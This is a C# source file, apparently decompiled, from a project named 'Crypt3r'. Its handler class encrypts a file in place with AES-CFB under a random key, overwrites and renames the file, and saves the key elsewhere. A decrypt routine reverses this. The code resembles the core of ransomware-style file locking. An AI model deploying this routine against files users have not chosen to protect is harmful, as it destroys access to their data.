using System;
using System.IO;
using System.Security.Cryptography;
using Alphaleonis.Win32.Filesystem;
using FileUtils;

namespace Crypt3r;

internal class CommonHandler : Handler
{
	public CommonHandler(string rK, string oF, string eF)
		: base(rK, oF, eF)
	{
	}

	public override void EncryptFile()
	{
		byte[] array3;
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			rijndaelManaged.Mode = CipherMode.CFB;
			rijndaelManaged.Padding = PaddingMode.Zeros;
			byte[] array = new byte[rijndaelManaged.KeySize / 8];
			byte[] array2 = new byte[rijndaelManaged.BlockSize / 8];
			RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
			try
			{
				rNGCryptoServiceProvider.GetBytes(array);
				rNGCryptoServiceProvider.GetBytes(array2);
			}
			catch
			{
			}
			array3 = new byte[array.Length + array2.Length];
			Array.Copy(array, array3, array.Length);
			Array.Copy(array2, 0, array3, array.Length, array2.Length);
			using (ICryptoTransform transform = rijndaelManaged.CreateEncryptor(array, array2))
			{
				using FileStream fileStream = Alphaleonis.Win32.Filesystem.File.Open(base.OriPath, FileMode.Open, FileAccess.ReadWrite, FileShare.None);
				using MemoryStream memoryStream = new MemoryStream();
				using (CryptoStream destination = new CryptoStream(memoryStream, transform, CryptoStreamMode.Write))
				{
					if (!fileStream.CanWrite)
					{
						throw new Exception(base.OriPath + " cannot write :(");
					}
					StreamExtensions.CopyTo(fileStream, destination);
				}
				fileStream.Seek(0L, SeekOrigin.Begin);
				fileStream.Write(memoryStream.ToArray(), 0, memoryStream.ToArray().Length);
			}
			Alphaleonis.Win32.Filesystem.File.ReadAllBytes(base.OriPath);
		}
		new Alphaleonis.Win32.Filesystem.FileInfo(base.OriPath).MoveTo(base.EncPath);
		KeyInfo ki = new KeyInfo
		{
			Key = array3,
			Info = "nothing"
		};
		SaveKeyInfo(ki);
	}

	public override void DecryptFile()
	{
		using (RijndaelManaged rijndaelManaged = new RijndaelManaged())
		{
			rijndaelManaged.Mode = CipherMode.CFB;
			rijndaelManaged.Padding = PaddingMode.Zeros;
			KeyInfo keyInfo = ReadKeyInfo();
			Alphaleonis.Win32.Filesystem.File.Delete(base.OriPath);
			byte[] array = new byte[rijndaelManaged.KeySize / 8];
			byte[] array2 = new byte[rijndaelManaged.BlockSize / 8];
			Array.Copy(keyInfo.Key, array, array.Length);
			Array.Copy(keyInfo.Key, array.Length, array2, 0, array2.Length);
			using ICryptoTransform transform = rijndaelManaged.CreateDecryptor(array, array2);
			using FileStream source = Alphaleonis.Win32.Filesystem.File.Open(base.EncPath, FileMode.Open, FileAccess.Read);
			using FileStream stream = Alphaleonis.Win32.Filesystem.File.Open(base.OriPath, FileMode.OpenOrCreate, FileAccess.Write);
			using CryptoStream destination = new CryptoStream(stream, transform, CryptoStreamMode.Write);
			StreamExtensions.CopyTo(source, destination);
		}
		Alphaleonis.Win32.Filesystem.File.Delete(base.EncPath);
	}
}
